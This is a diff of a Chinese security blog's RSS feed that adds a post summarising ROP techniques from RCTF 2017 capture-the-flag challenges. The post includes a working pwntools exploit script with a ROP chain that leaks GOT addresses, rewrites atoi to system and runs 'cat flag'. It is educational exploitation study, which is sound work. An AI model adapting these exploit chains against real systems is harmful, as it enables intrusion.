@@ -8,11 +8,11 @@
     <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
     
     <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
-    <pubDate>Wed, 26 Jul 2017 03:02:12 GMT</pubDate>
+    <pubDate>Wed, 26 Jul 2017 05:43:59 GMT</pubDate>
     <generator>http://hexo.io/</generator>
     
     <item>
-      <title>glibc malloc学习笔记之fastbin</title>
+      <title>glibc malloc学习笔记之fastbin🐦</title>
       <link>http://0x48.pw/2017/07/25/0x35/</link>
       <guid>http://0x48.pw/2017/07/25/0x35/</guid>
       <pubDate>Mon, 24 Jul 2017 16:25:59 GMT</pubDate>
@@ -24,7 +24,7 @@
       
       <content:encoded><![CDATA[<p>fastbin相关的堆知识我一年前就学过了，但是都没写啥记录文档，又咸鱼了好长一段时间，要捡回来这块的知识，又重新开始学习了一遍，这篇博文中记录下我对fastbin的个人理解。</p>
 <a id="more"></a>
-<h1 id="基础知识研究"><a href="#基础知识研究" class="headerlink" title="基础知识研究"></a>基础知识研究</h1><p>当使用malloc函数第一次向系统申请&lt;128kb的内存时，会通过sys_brk申请132kb的内存，这块内存就称为堆。</p>
+<h1 id="基础知识研究"><a href="#基础知识研究" class="headerlink" title="基础知识研究"></a>基础知识研究</h1><p>当使用malloc函数第一次向系统申请小于128kb的内存时，会通过sys_brk申请132kb的内存，这块内存就称为堆。</p>
 <p>写个测试代码，对着测试代码进行分析(64位系统)：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># test.c</span></div><div class="line"><span class="meta"># gcc test.c -o test</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">char</span> *q;</div><div class="line">	<span class="keyword">char</span> *p;</div><div class="line">	<span class="keyword">int</span> x;</div><div class="line">	<span class="keyword">char</span> input[<span class="number">3</span>];</div><div class="line"></div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</div><div class="line">		read(<span class="number">0</span>,input,<span class="number">3</span>);</div><div class="line">		x = atoi(input);</div><div class="line">		q = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(x);</div><div class="line">		read(<span class="number">0</span>,input,<span class="number">3</span>);</div><div class="line">		x = atoi(input);</div><div class="line">		p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(x);</div><div class="line">		<span class="built_in">free</span>(q);</div><div class="line">		<span class="built_in">free</span>(p);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>然后使用gdb进行调试(使用peda和libheap插件，这两个都可以在github上搜到)，当第一次调用malloc(0x10)之后，查看内存信息：</p>
@@ -106,7 +106,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fastbin -&gt; list47</div><div class="line">list47.fd -&gt; list0</div><div class="line">list0.fd -&gt; list47</div></pre></td></tr></table></figure>
 <p>然后，就涉及到了第二个bug，<code>int chunk_number;</code>，chunk_number的值为int，所以在free_chunk函数中，id&gt;chunk_number的比较可以让id为负数来bypass</p>
 <p>看之后的payload，free了3次list[-3] (list[-3] == list[0xfffffffd])</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">.bss:0000000000602080 chunk_number    dd ?                    ; DATA XREF: create_chunk+8r</div><div class="line">.bss:0000000000602080                                         ; create_chunk:loc_4008B6r ...</div><div class="line">.bss:0000000000602084                 align 20h</div><div class="line">.bss:00000000006020A0                 public list</div><div class="line">.bss:00000000006020A0 ; void *list</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.bss:0000000000602080 chunk_number    dd</div><div class="line">.bss:0000000000602084                 align 20h</div><div class="line">.bss:00000000006020A0                 public list</div><div class="line">.bss:00000000006020A0 ; void *list</div></pre></td></tr></table></figure>
 <p>通过ida可以看到list[-3]的地址为0x0602088，值为0(不知道为啥list和chunk_number之间有28byte没被使用的内存)</p>
 <p>所以我们实际执行的是3次free(0)，而该操作并不会改变啥，所以实际的效果只有：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">list[-3] = list[0]</div><div class="line">list[-2] = list[1]</div><div class="line">list[-1] = lsit[2]</div><div class="line">......</div><div class="line">list[44] = list[47]</div><div class="line">list[45] = list[47]</div><div class="line">list[46] = list[47]</div></pre></td></tr></table></figure>
@@ -194,6 +194,67 @@
 ]]></content:encoded>
       
       <comments>http://0x48.pw/2017/07/12/0x34/#disqus_thread</comments>
+    </item>
+    
+    <item>
+      <title>ROP小结</title>
+      <link>http://0x48.pw/2017/05/23/0x33/</link>
+      <guid>http://0x48.pw/2017/05/23/0x33/</guid>
+      <pubDate>Tue, 23 May 2017 04:01:12 GMT</pubDate>
+      <description>
+      
+        &lt;p&gt;这次RCTF，对于本以为掌握了的ROP，学到了新的姿势，在这里总结下。&lt;/p&gt;
+      
+      </description>
+      
+      <content:encoded><![CDATA[<p>这次RCTF，对于本以为掌握了的ROP，学到了新的姿势，在这里总结下。</p>
+<a id="more"></a>
+<p>本文不进行实例调试，用脑子DEBUG……详细文件可以去我的github上找…</p>
+<h1 id="RCalc"><a href="#RCalc" class="headerlink" title="RCalc"></a>RCalc</h1><p>首先是计算器这题，作者自己实现了一个canary，首先在每个函数开头通过<code>sub_400AAB</code>函数生成了一个随机数，存放到堆中，和栈上面，然后在函数结尾使用<code>sub_400B92</code>函数检查这个栈上的随机数和堆中的随机数是否一样。</p>
+<p>然后可以去看看<code>sub_400A06</code>函数，在存放canary的堆上面有个一个0x100的堆，用于存放需要保存的计算结果，这个结果保存的函数没设定边界值，所以可以覆盖到canary的堆，从而覆盖到canary。</p>
+<p>绕过canary后，在<code>sub_400FA2</code>函数中，scanf函数存在栈溢出，正常情况下想，之后就是通过ROP很容易就能getshell了。</p>
+<p>但是，这里有一个坑点，scanf函数的<code>%s</code>不能出现<code>\x09</code>, <code>\x0a</code>, <code>\x0b</code>, <code>\x0c</code>, <code>\x0d</code>, <code>\x20</code></p>
+<p>经过测试，如果输入中出现这几个字符，会被转成<code>\x00</code>，或者之后的数据就不会被读入变量中。</p>
+<p>这对我来说非常致命，因为got表的地址中都含有<code>\x20</code>，还有一些ROP被这些字符限制着，当时还想到了一个别的思路，比如利用<code>read</code>函数或者<code>sub_400c4e</code>函数，但是没找到控制rdx的ROP所以没法用<code>read</code>函数，另外，就算能调用，也没有思路下一步该怎么做，该读到什么位置？然后该怎么通过<code>read</code>继续溢出？</p>
+<p>而关于<code>sub_400c4e</code>函数，虽然函数中含有<code>\x0c</code>字符，但是我找到了一个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">add eax, 0x48002018 ; test eax, eax ; je 0x400803 ; call rax</div></pre></td></tr></table></figure>
+<p>通过这个ROP就能调用<code>sub_400c4e</code>了，而<code>rdx</code>为最后一次choice输入的值，因为处理这个输入值得时候有个cdqe，虽然如果我输入0x100000005在判断中也是5，通过这个思路，可以让<code>sub_400c4e</code>函数中进行溢出，rdi和rsi也都是可控的。</p>
+<p>但是在测试中发现，首先我不知道栈地址，所以没法控制rsi，而在<code>sub_400FA2</code>函数的ret指令时，rsi正好就是一个栈地址，在当前栈地址的很上面，这种情况下，栈溢出会覆盖掉<code>sub_400c4e</code>的局部变量，导致没法成功进行栈溢出。</p>
+<p>在比赛结束之后，看来国外的一篇wp后，学到了两个知识点: <a href="http://hama.hatenadiary.jp/entry/2017/05/22/092142" target="_blank" rel="external">http://hama.hatenadiary.jp/entry/2017/05/22/092142</a></p>
+<p>首先是他们找的ROP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8];</div><div class="line">pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15; ret ;</div></pre></td></tr></table></figure>
+<p>通过这个ROP基本可以调用任意函数了，我找ROP一般是使用默认的命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ROPgadget --binary RCalc</div></pre></td></tr></table></figure>
+<p>但是却没有这个ROP，需要用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ROPgadget --binary RCalc --depth 11</div></pre></td></tr></table></figure>
+<p>才有第二句ROP，而第一句还是没有。。所以我发现，我在找ROP上还是太菜了….</p>
+<h2 id="UPDATE-20170528"><a href="#UPDATE-20170528" class="headerlink" title="UPDATE 20170528"></a><em>UPDATE 20170528</em></h2><p>经过大佬教育，原来这是64位程序中存在的一个万能ROP，这两句ROP在同一个函数里，而这个函数是gcc编译进程序中去的</p>
+<hr>
+<p>其实，当时我已经基本可以做到调用任意函数了，但是关键点还是第二点。</p>
+<p>使用:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">leave  ; ret ;</div></pre></td></tr></table></figure>
+<p>来修改栈地址，这样一来思路就很清晰了。<br>找一段可以写的地址，比如bss区域，写入ROP，然后再把rsp修改成该地址，就可以getshell了，同read函数向bss区域写值，然后使用<code>leave</code>修改rsp</p>
+<p>我还是太菜，从来没想过修改栈地址……</p>
+<h1 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h1><p>本来也是一道简单的栈溢出，但循环的判断:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">while(read(0, buf, 0x10)&gt;0)</div></pre></td></tr></table></figure>
+<p>要栈溢出首先得先停了这个循环，在shell中可以使用ctrl+d表示EOF，但是脚本咋写？<br>发现pwntools可以用下面的命令发送EOF</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">s = remote(xxxx,xx)</div><div class="line">s.sock.shutdown(socket.SHUT_RW)</div></pre></td></tr></table></figure>
+<p>但是这样我们没法继续输入了，所以我们需要发送一次payload就getflag，我们只能getflag而不能getshell，因为服务器已经关闭了接收我们数据的连接。</p>
+<p>这题没有libc，所以写ROP又是一个技术活….</p>
+<p>使用下面这个PoC:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># coding=utf-8</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &quot;debug&quot;</div><div class="line"># context.terminal = [&apos;terminator&apos;, &apos;-x&apos;, &apos;bash&apos;, &apos;-c&apos;]</div><div class="line">debug = 1</div><div class="line">if debug:</div><div class="line">    p = remote(&quot;127.0.0.1&quot;, 10001)</div><div class="line">else:</div><div class="line">    p = remote(&quot;recho.2017.teamrois.cn&quot;, 9527)</div><div class="line">e = ELF(&apos;Recho&apos;)</div><div class="line"># gdb.attach(p)</div><div class="line">padding = 0x38*&apos;a&apos;          #padding</div><div class="line"># write(1, got[&apos;read&apos;], 8)</div><div class="line">payload = &quot;&quot;</div><div class="line">payload += p64(0x4008a3)  # pop rdi;ret</div><div class="line">payload += p64(1)         # rdi = 1</div><div class="line">payload += p64(0x4008a1)  # pop rsi; pop r15; ret</div><div class="line">payload += p64(e.got[&apos;read&apos;])  # rsi = got.plt read</div><div class="line">payload += p64(0)         # r15 = 0</div><div class="line">payload += p64(0x4006fe)  # pop rdx;ret</div><div class="line">payload += p64(8)         # rdx = 8</div><div class="line">payload += p64(e.symbols[&apos;write&apos;])  # call write</div><div class="line"># write(1, got[&apos;write&apos;], 8)</div><div class="line">payload += p64(0x4008a3)  # pop rdi;ret</div><div class="line">payload += p64(1)         # rdi = 1</div><div class="line">payload += p64(0x4008a1)  # pop rsi; pop r15; ret</div><div class="line">payload += p64(e.got[&apos;atoi&apos;])  # rsi = got.plt atoi</div><div class="line">payload += p64(0)         # r15 = 0</div><div class="line">payload += p64(0x4006fe)  # pop rdx;ret</div><div class="line">payload += p64(8)         # rdx = 8</div><div class="line">payload += p64(e.symbols[&apos;write&apos;])  # call write</div><div class="line"></div><div class="line"></div><div class="line">p.readuntil(&quot;server!\n&quot;)</div><div class="line">p.sendline(&apos;1000&apos;)</div><div class="line">p.sendline(padding + payload)</div><div class="line">p.recv()</div><div class="line">p.sock.shutdown(1)</div><div class="line">print u64(p.recv(8)) - u64(p.recv(8))</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>经过远程和本地测试对比，发现远程的libc应该和我本地的一样</p>
+<p>然后使用本地的libc写payload就好了。。</p>
+<p>思路是改写got表中随便一个函数的地址改成system就好了，比如我修改的是atoi函数，然后找binary中的ROP，找到下面三个：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">pop rdi; ret;</div><div class="line">pop rax; ret;</div><div class="line">add [rdi], al; ret;</div></pre></td></tr></table></figure>
+<p>通过这三个，我们就能修改偏移了，比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">payload += p64(0x4008a3)+p64(0x601040)    # pop rdi; ret;   rdi = 0x601040; atoi</div><div class="line">payload += p64(0x4006fc)+p64(0x10) + p64(0x40070d)  # pop rax; ret;   rax = 0x10; add [rdi], al; ret;</div><div class="line"></div><div class="line">payload += p64(0x4008a3)+p64(0x601041)    # pop rdi; ret;   rdi = 0x601041;</div><div class="line">payload += p64(0x4006fc)+p64(229) + p64(0x40070d)   # pop rax; ret;   rax=0xe5;   add [rdi], al; ret;</div></pre></td></tr></table></figure>
+<p>这相当于got表中atoi函数的地址加上0xe510</p>
+<p>同样再使用上面的ROP往bss中写入<code>cat flag</code>，最后输出的指令是<code>system(&#39;cat flag&#39;)</code></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本以为栈溢出都会了，其实还是太菜…..</p>
+]]></content:encoded>
+      
+      <comments>http://0x48.pw/2017/05/23/0x33/#disqus_thread</comments>
     </item>
     
   </channel>
